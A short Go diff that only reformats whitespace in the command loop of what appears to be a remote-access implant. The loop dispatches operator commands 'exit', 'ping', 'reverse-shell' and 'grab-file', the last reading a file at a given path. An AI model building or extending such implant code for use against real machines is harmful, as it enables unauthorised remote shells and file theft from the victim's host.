@@ -19,25 +19,20 @@ func CommandLoop(cmdCon comms.Connection) (err error) {
 		}
 
 		log.Printf("Recv: %s", message)
-
 		args := strings.Split(message, " ")
-		switch args[0] {
 
+		switch args[0] {
 		case "exit":
 			log.Println("Exiting")
 			_ = cmdCon.Close()
 			os.Exit(0)
-
 		case "ping":
 			err = commands.PingReply(cmdCon)
-
 		case "reverse-shell":
 			err = commands.ReverseShellReply(cmdCon)
-
 		case "grab-file":
 			path := strings.Join(args[1:], " ")
 			err = commands.GrabFileReply(cmdCon, path)
-
 		}
 
 		if comms.IsNetworkError(err) {
